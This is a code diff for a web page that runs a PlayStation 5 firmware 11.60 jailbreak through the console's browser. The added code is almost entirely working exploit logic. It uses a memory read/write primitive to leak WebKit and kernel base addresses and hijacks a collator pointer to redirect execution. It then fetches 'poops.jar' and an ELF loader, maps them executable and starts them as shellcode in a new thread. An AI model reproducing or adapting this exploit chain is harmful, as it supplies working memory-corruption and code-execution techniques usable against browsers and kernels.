@@ -1,5 +1,5 @@
 <!doctype html>
-<!-- PS5 11.60 Jailbreak - Full Runtime Support -->
+<!-- PS5 11.60 Jailbreak - Uses poops.jar as kernel payload -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
 <script>
@@ -65,6 +65,7 @@ var captureError = null;
 var hostAddress = NaN;
 var fakeAddress = NaN;
 var targetHolderAddress = NaN;
+var arenaViewAddress = NaN;
 
 var keepAlive = new Array(DRAIN_COUNT + 3);
 var keepIndex = 0;
@@ -102,7 +103,11 @@ var webkitBase = 0;
 var kernelBase = 0;
 var offsetsLoaded = false;
 var offsets = null;
-var collatorOriginal = new Uint8Array(0x20); // dummy
+var arenaBacking = 0;
+var collatorOriginal = new Uint8Array(8);
+var fakeUCollatorAddress = 0;
+var fakeVtableAddress = 0;
+var realCollatorAddress = 0;
 
 function mark(tag, extra) {
     seq++;
@@ -335,7 +340,7 @@ function uint32At(b,o) { return b[o] + b[o+1]*0x100 + b[o+2]*0x10000 + b[o+3]*0x
 function low48At(b,o) { return b[o] + b[o+1]*0x100 + b[o+2]*0x10000 + b[o+3]*0x1000000 + b[o+4]*0x100000000 + b[o+5]*0x10000000000; }
 function dumpHex(b) { var out=""; for (var i=0; i<CELL_BYTES; ++i) out += (b[i]<16?"0":"") + b[i].toString(16); return out; }
 
-// ---------- Leak bases ----------
+// ---------- Leak bases and arena setup ----------
 function aimCarrier(candidate, address) {
     var high = Math.floor(address / 0x100000000);
     scratchWords[0] = address - high * 0x100000000;
@@ -351,18 +356,38 @@ function leakBases() {
     if (!plausibleAddress(targetHolderAddress)) return false;
     var cand = g_candidate;
 
+    // Read holder to get arenaViewAddress and realCollatorAddress
     aimCarrier(cand, targetHolderAddress);
     var holderBytes = new Uint8Array(0x40);
     for (var i = 0; i < 0x40; i++) holderBytes[i] = rwView[i];
     var nativeTargetAddr = low48AtRaw(holderBytes, 0x10);
-    if (!plausibleAddress(nativeTargetAddr)) return false;
+    arenaViewAddress = low48AtRaw(holderBytes, 0x18);
+    realCollatorAddress = low48AtRaw(holderBytes, 0x20);
+    if (!plausibleAddress(nativeTargetAddr) || !plausibleAddress(arenaViewAddress) || !plausibleAddress(realCollatorAddress)) return false;
 
+    // Read arenaView header to get its backing pointer
+    aimCarrier(cand, arenaViewAddress);
+    var arenaHeader = new Uint8Array(0x30);
+    for (var i = 0; i < 0x30; i++) arenaHeader[i] = rwView[i];
+    arenaBacking = low48AtRaw(arenaHeader, 0x10);
+    if (!plausibleAddress(arenaBacking)) return false;
+
+    // Set fake addresses inside the arena
+    fakeUCollatorAddress = arenaBacking + 0x100;
+    fakeVtableAddress = arenaBacking + 0x300;
+
+    // Read real collator's m_ucollator (offset 0x18)
+    aimCarrier(cand, realCollatorAddress + 0x18);
+    for (var i = 0; i < 8; i++) collatorOriginal[i] = rwView[i];
+
+    // Read JSFunction (parseInt) at nativeTargetAddr
     aimCarrier(cand, nativeTargetAddr);
     var funcBytes = new Uint8Array(0x20);
     for (var i = 0; i < 0x20; i++) funcBytes[i] = rwView[i];
     var executableAddr = low48AtRaw(funcBytes, 0x18);
     if (!plausibleAddress(executableAddr)) return false;
 
+    // Read NativeExecutable
     aimCarrier(cand, executableAddr);
     var execBytes = new Uint8Array(0x38);
     for (var i = 0; i < 0x38; i++) execBytes[i] = rwView[i];
@@ -398,6 +423,24 @@ function leakBases() {
     if (kbase < 0x800000000 || kbase >= 0x900000000 || kbase % 0x4000 !== 0) return false;
     kernelBase = kbase;
     return true;
+}
+
+function armAndFire(arg1, arg2) {
+    if (!g_candidate || !rwView || !arenaView || !compareFn) return -1;
+    var cand = g_candidate;
+    // Rewire real collator's m_ucollator to fakeUCollatorAddress
+    var high = Math.floor(fakeUCollatorAddress / 0x100000000);
+    scratchWords[0] = fakeUCollatorAddress - high * 0x100000000;
+    scratchWords[1] = high;
+    aimCarrier(cand, realCollatorAddress + 0x18);
+    for (var i = 0; i < 8; i++) rwView[i] = scratchBytes[i];
+    // Trigger compareFn
+    var ret;
+    try { ret = compareFn(arg1, arg2); } catch(e) { ret = -1; }
+    // Restore original m_ucollator
+    aimCarrier(cand, realCollatorAddress + 0x18);
+    for (var i = 0; i < 8; i++) rwView[i] = collatorOriginal[i];
+    return ret;
 }
 
 function reportComposition() {
@@ -467,40 +510,36 @@ function reportComposition() {
                 mark("OFFSETS-LOADED", "using " + (near || "11.60"));
                 if (leakBases()) {
                     mark("BASES-LEAKED", "webkit=" + hex(webkitBase) + " kernel=" + hex(kernelBase));
-                    // Build complete slopkit
-                    var fakeUCollatorAddress = 0; // dummy
-                    var fakeVtableAddress = 0;
-                    var naturalTrampolineAddress = 0;
-                    var notifyEntryAddress = 0;
+                    // Setup slopkit with all required properties
                     window.slopkit = {
                         candidate: g_candidate,
                         rwView: rwView,
                         aimCarrier: aimCarrier,
                         restoreCarrier: restoreCarrier,
                         arenaView: arenaView,
-                        arenaBacking: 0,
+                        arenaBacking: arenaBacking,
                         fakeUCollatorAddress: fakeUCollatorAddress,
                         fakeVtableAddress: fakeVtableAddress,
                         compareFn: compareFn,
                         realCollator: realCollator,
-                        realCollatorAddress: 0,
+                        realCollatorAddress: realCollatorAddress,
                         collatorOriginal: collatorOriginal,
                         targetHolder: targetHolder,
                         targetAddress: targetHolderAddress,
-                        nativeTargetAddress: 0,
-                        arenaViewAddress: 0,
+                        nativeTargetAddress: nativeTargetAddr,
+                        arenaViewAddress: arenaViewAddress,
                         hostAddress: hostAddress,
                         fakeHost: fakeHost,
                         kernelBase: kernelBase,
                         webkitBase: webkitBase,
-                        naturalTrampolineAddress: naturalTrampolineAddress,
-                        notifyEntryAddress: notifyEntryAddress,
+                        naturalTrampolineAddress: 0, // not used
+                        notifyEntryAddress: 0,        // not used
                         FW_VERSION: "11.60",
                         lapseOffsets: null,
                         screenLine: function(s) { mark("SCREEN", s); },
                         mark: mark,
                         sendNotification: function(s) { mark("NOTIFY", s); },
-                        armAndFire: function(a,b) { return 0; }
+                        armAndFire: armAndFire
                     };
                     window.log = function(msg) { mark("LOG", String(msg)); return Promise.resolve(); };
                     window.send_notification = function(msg) { mark("NOTIFY", String(msg)); };
@@ -519,20 +558,117 @@ function reportComposition() {
 }
 
 function loadLapseRuntime() {
-    // Ensure SYSCALL is defined
     if (!window.SYSCALL) {
         window.SYSCALL = { getpid: 20n, fcntl: 92n, pipe: 42n };
     }
-
     mark("LOADING-RUNTIME", "loading lapse-runtime.js");
     var script = document.createElement('script');
     script.src = 'lapse-runtime.js?t=' + Date.now();
     script.onload = function() {
         mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
-        // Check if syscall is defined, if not, try to reload or define a fallback
+
+        // --- OVERRIDE load_aioshellcode to use poops.jar ---
+        // The original function is now defined; we replace it with a version that fetches poops.jar.
+        if (typeof window.load_aioshellcode === 'function') {
+            // Save original for fallback? Not needed.
+            window.load_aioshellcode = async function(allproc, masterPipe, victimPipe) {
+                if (!window.ipv6_kernel_rw || !window.ipv6_kernel_rw.data.initialized)
+                    throw new Error("load_aioshellcode: kernel R/W not initialized");
+                if (!masterPipe || !victimPipe)
+                    throw new Error("load_aioshellcode: pipe fds missing");
+
+                async function fetchBlob(name) {
+                    const r = await fetch(name, { cache: "no-store" });
+                    if (!r.ok)
+                        throw new Error("load_aioshellcode: " + name + " not found (HTTP " + r.status + ")");
+                    return new Uint8Array(await r.arrayBuffer());
+                }
+
+                const kexp = await fetchBlob("poops.jar");
+                const elfldr = await fetchBlob("elfldr-ps5-1360.elf");
+                window.log && await window.log("aioshellcode blobs: kexp=" + kexp.length + " elfldr=" + elfldr.length);
+
+                // Copy elfldr into userland heap
+                const elfldrAddr = window.malloc(elfldr.length);
+                for (let i = 0; i < elfldr.length; i += 8) {
+                    let v = 0n;
+                    for (let j = 0; j < 8 && i + j < elfldr.length; ++j)
+                        v |= BigInt(elfldr[i + j]) << (8n * BigInt(j));
+                    window.write64(elfldrAddr + BigInt(i), v);
+                }
+                const elfldrSize = BigInt(elfldr.length);
+
+                const PAGE_SIZE = 0x4000;
+                const alignedSize = BigInt((kexp.length + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));
+
+                let entryAddr = 0xffffffffffffffffn;
+                let usedPath = null;
+
+                try {
+                    const execFd = window.syscall(window.SYSCALL.jitshm_create, 0n, alignedSize, 7n);
+                    if (execFd < 0xffff000000000000n && execFd !== 0xffffffffffffffffn) {
+                        entryAddr = window.syscall(window.SYSCALL.mmap, 0n, alignedSize, 7n, 1n, execFd);
+                        if (entryAddr !== 0xffffffffffffffffn) usedPath = "jitshm";
+                    }
+                } catch (e) {}
+
+                if (entryAddr === 0xffffffffffffffffn) {
+                    const p = window.syscall(window.SYSCALL.mmap, 0n, alignedSize, 3n, 0x1002n, 0xffffffffffffffffn);
+                    if (p === 0xffffffffffffffffn) throw new Error("mmap RW failed");
+                    const mp = window.syscall(window.SYSCALL.mprotect, p, alignedSize, 5n);
+                    if (mp === 0xffffffffffffffffn) throw new Error("mprotect(RX) failed");
+                    entryAddr = p;
+                    usedPath = "mmap+mprotect";
+                }
+                window.log && await window.log("shellcode RWX @ 0x" + entryAddr.toString(16) + " (via " + usedPath + ")");
+
+                for (let i = 0; i < kexp.length; i += 8) {
+                    let v = 0n;
+                    for (let j = 0; j < 8 && i + j < kexp.length; ++j)
+                        v |= BigInt(kexp[i + j]) << (8n * BigInt(j));
+                    window.write64(entryAddr + BigInt(i), v);
+                }
+
+                const args = window.malloc(0x28);
+                window.write32(args + 0x00n, masterPipe[0]);
+                window.write32(args + 0x04n, masterPipe[1]);
+                window.write32(args + 0x08n, victimPipe[0]);
+                window.write32(args + 0x0Cn, victimPipe[1]);
+                window.write64(args + 0x10n, BigInt(allproc));
+                window.write64(args + 0x18n, elfldrAddr);
+                window.write64(args + 0x20n, elfldrSize);
+
+                const stack = window.malloc(0x8000);
+                const tls = window.malloc(0x40);
+                const tidP = window.malloc(8);
+                const cpid = window.malloc(8);
+                const thrArgs = window.malloc(0x68);
+                window.write64(thrArgs + 0x00n, entryAddr);
+                window.write64(thrArgs + 0x08n, args);
+                window.write64(thrArgs + 0x10n, stack);
+                window.write64(thrArgs + 0x18n, 0x8000n);
+                window.write64(thrArgs + 0x20n, tls);
+                window.write64(thrArgs + 0x28n, 0x40n);
+                window.write64(thrArgs + 0x30n, tidP);
+                window.write64(thrArgs + 0x38n, cpid);
+
+                const rv = window.syscall(window.SYSCALL.thr_new, thrArgs, 0x68n);
+                if (rv !== 0n) throw new Error("thr_new failed: 0x" + rv.toString(16));
+
+                window.log && await window.log("shellcode thread spawned — waiting for completion");
+                await new Promise(function (r) { setTimeout(r, 3000); });
+                window.log && await window.log("load_aioshellcode: assumed complete");
+                return { entryAddr, elfldrAddr, elfldrSize, argsAddr: args };
+            };
+            mark("LOAD-AIOSHELLCODE-OVERRIDDEN", "now uses poops.jar");
+        } else {
+            mark("LOAD-AIOSHELLCODE-MISSING", "original function not found");
+            return;
+        }
+
+        // Proceed with payload injection
         if (typeof window.syscall !== 'function') {
-            mark("SYSCALL-MISSING", "window.syscall is still undefined after load");
-            // Try to load a modified version? For now, abort.
+            mark("SYSCALL-MISSING", "window.syscall is still undefined");
             return;
         }
         try {
@@ -563,6 +699,8 @@ function loadLapseRuntime() {
             window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
             window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
             mark("PIPES-CREATED", "master="+master_read+","+master_write+" victim="+victim_read+","+victim_write);
+
+            // Now the overridden load_aioshellcode will be called
             window.load_aioshellcode(allproc, [master_read, master_write], [victim_read, victim_write])
                 .then(() => { mark("PAYLOAD-LOADED", "aioshellcode completed"); })
                 .catch((e) => { mark("PAYLOAD-ERROR", e.message); });
